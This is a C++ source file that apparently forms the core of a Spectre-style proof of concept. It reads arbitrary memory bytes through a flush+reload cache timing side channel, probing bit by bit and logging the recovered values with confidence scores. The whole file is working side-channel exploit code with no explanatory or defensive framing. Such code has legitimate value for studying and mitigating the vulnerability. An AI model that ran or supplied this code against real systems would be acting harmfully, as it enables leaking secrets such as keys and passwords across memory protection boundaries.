#include "spectre.h"

spectre::Base::~Base() {
}

void spectre::Base::before() {
}

void spectre::Base::after() {
}

void spectre::Base::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
    uint8_t value = *data;
    volatile uint8_t tmp = cache_probe[(mask & value) * CACHE_LINE_SIZE];
}

void spectre::Base::readMemoryByte(const uint8_t* target_ptr, uint8_t value[2], int score[2]) {
    int results[256];
    for (int i = 0; i < 256; i++)
      results[i] = 0;

    for (int tries = 999; tries > 0; tries--) {
        uint8_t result = 0;
        for (uint8_t mask=1; mask; mask=mask<<1) {
            sched_yield();
            libflush.flush(&this->cache_probe[mask * CACHE_LINE_SIZE]);
            fence();

            //Access that bit and signal on the cache_probe
            this->probe_bit(mask, target_ptr, this->cache_probe);

            // --- Check probing result measuring cache timing
            if (libflush.is_cache_hit(&cache_probe[mask * CACHE_LINE_SIZE])) {
                result |= mask;
            }
        }
        results[result]++;

        /* Locate highest & second-highest results results tallies in j/k */
        int first=-1, second=-1;
        for (int i = 0; i < 256; i++) {
            if (first < 0 || results[i] >= results[first]) {
                second  = first;
                first = i;
            } else if (second < 0 || results[i] >= results[second]) {
                second = i;
            }
        }
        if (results[first] >= (2 * results[second] + 5) || (results[first] == 2 && results[second] == 0)) {
            value[0] = (uint8_t) first;
            score[0] = results[first];
            value[1] = (uint8_t) second;
            score[1] = results[second];
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
        }
    }
}

void spectre::Base::dump(const uint8_t* target_ptr, size_t target_len) {
    this->before();

    for (const uint8_t* ptr = target_ptr; ptr < target_ptr + target_len; ptr++) {
        uint8_t value[2];
        int score[2];
        readMemoryByte(ptr, value, score);

        LOG(
            "Reading at %p... %s: 0x%02X='%c', score=%d",
            ptr,
            (score[0] >= 2 * score[1] ? "Success" : "Unclear"),
            value[0],
            value[0] > 31 && value[0] < 127 ? value[0] : '?',
            score[0]);

        if (score[1] > 0)
            LOG("(second best: 0x%02X score=%d)", value[1], score[1]);
    }

    this->after();
}
